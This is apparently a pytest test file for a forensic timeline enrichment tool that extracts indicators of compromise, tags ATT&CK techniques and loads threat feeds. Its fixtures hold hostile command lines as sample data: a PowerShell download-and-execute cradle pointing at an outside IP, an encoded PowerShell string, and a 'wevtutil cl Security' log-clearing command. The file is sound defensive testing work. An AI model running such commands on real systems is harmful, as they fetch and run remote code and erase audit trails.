from __future__ import annotations

import csv
import json

import pytest

from analysis_enrich import attack
from analysis_enrich.extract import indicators
from analysis_enrich.feeds import load_feed, region_for_ip
from analysis_enrich.enrich import enrich, write
from analysis_enrich.cli import main


def _timeline_csv(path):
    rows = [
        {"timestamp_utc": "2026-03-16T10:00:00Z", "timestamp_type": "M",
         "tool": "windows_pslogging", "artifact": "4104", "host": "WS01",
         "user": "victim",
         "description": "IEX (New-Object Net.WebClient).DownloadString("
                        "'http://45.9.148.20/a.ps1')", "extra": ""},
        {"timestamp_utc": "2026-03-16T10:05:00Z", "timestamp_type": "M",
         "tool": "windows_evtx", "artifact": "1102", "host": "WS01",
         "user": "attacker",
         "description": "the audit log was cleared", "extra": ""},
        {"timestamp_utc": "2026-03-16T10:10:00Z", "timestamp_type": "B",
         "tool": "windows_amcache", "artifact": "file", "host": "WS01",
         "user": "",
         "description": "C:\\Users\\victim\\evil.exe sha1="
                        "da39a3ee5e6b4b0d3255bfef95601890afd80709", "extra":
                        "domain=evil.example"},
    ]
    with open(path, "w", newline="", encoding="utf-8-sig") as fh:
        w = csv.DictWriter(fh, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)
    return rows


def test_extract():
    ind = indicators("connect http://45.9.148.20:443/x to bad.example and "
                     "hash 5d41402abc4b2a76b9719d911017c592")
    assert "45.9.148.20" in ind["ipv4"]
    assert "bad.example" in ind["domain"]
    assert "5d41402abc4b2a76b9719d911017c592" in ind["md5"]
    assert any(u.startswith("http://45.9.148.20") for u in ind["url"])


def test_attack_tags():
    t = dict(attack.tag("powershell -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoA "
                        "and wevtutil cl Security"))
    assert "T1059.001" in t
    assert "T1027" in t
    assert "T1070.001" in t
    assert attack.tag("just some benign text") == []


def test_region():
    r = region_for_ip("104.18.2.10")
    assert any(x in r for x in ("ARIN", "RIPE", "APNIC", "LACNIC", "AFRINIC",
                                "unallocated"))
    assert region_for_ip("10.0.0.1") == "private / reserved"
    assert region_for_ip("192.168.1.1") == "private / reserved"


def test_feed_formats(tmp_path):
    (tmp_path / "list.txt").write_text("45.9.148.20\nevil.example\n# comment\n")
    (tmp_path / "f.csv").write_text("indicator,type,source\n"
                                    "9.9.9.9,ipv4,ThreatFeedX\n")
    (tmp_path / "stix.json").write_text(json.dumps({"indicators": [
        {"pattern": "[ipv4-addr:value = '8.8.4.4']", "name": "TestTI"}]}))
    f = load_feed(str(tmp_path / "list.txt"))
    assert "45.9.148.20" in f and "evil.example" in f
    assert load_feed(str(tmp_path / "f.csv"))["9.9.9.9"] == "ThreatFeedX"
    assert load_feed(str(tmp_path / "stix.json"))["8.8.4.4"] == "TestTI"


def test_enrich(tmp_path):
    tl = tmp_path / "tl.csv"
    _timeline_csv(tl)
    (tmp_path / "iocs.txt").write_text("45.9.148.20,ipv4,APT-C2\n"
                                       "evil.example,domain,APT-C2\n")
    (tmp_path / "known.csv").write_text(
        "da39a3ee5e6b4b0d3255bfef95601890afd80709,bad\n")

    res = enrich(str(tl), feed_paths=[str(tmp_path / "iocs.txt")],
                 known_csv=str(tmp_path / "known.csv"))
    assert set(res.columns) >= {"ioc", "attack", "geo", "known"}
    r0, r1, r2 = res.rows
    assert "45.9.148.20" in r0["ioc"]
    assert "APT-C2" in r0["ioc_source"]
    assert "T1105" in r0["attack"] and "T1059.001" in r0["attack"]
    assert "45.9.148.20=" in r0["geo"]
    assert "T1070.001" in r1["attack"]
    assert "evil.example" in r2["ioc"]
    assert "=bad" in r2["known"]
    assert res.known_bad == 1


def test_cli_roundtrip(tmp_path):
    tl = tmp_path / "tl.csv"
    _timeline_csv(tl)
    (tmp_path / "f.txt").write_text("45.9.148.20\n")
    out = tmp_path / "out.csv"
    rc = main([str(tl), "--feed", str(tmp_path / "f.txt"), "-o", str(out),
               "-q"])
    assert rc == 0
    assert out.read_bytes().startswith(b"\xef\xbb\xbf")
    rows = list(csv.DictReader(out.read_text(encoding="utf-8-sig")
                               .splitlines()))
    assert rows[0]["ioc"] == "45.9.148.20"
    assert "attack" in rows[0]


def test_jsonl(tmp_path):
    src = tmp_path / "tl.jsonl"
    src.write_text('\n'.join(json.dumps(r) for r in _timeline_csv(
        tmp_path / "ignore.csv")))
    out = tmp_path / "o.jsonl"
    main([str(src), "-o", str(out), "-q"])
    lines = [json.loads(x) for x in out.read_text().splitlines() if x.strip()]
    assert lines and "attack" in lines[0]


def test_csv_injection_guard():
    from analysis_enrich.tracelib import sanitize
    assert sanitize("=1") == "'=1"


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
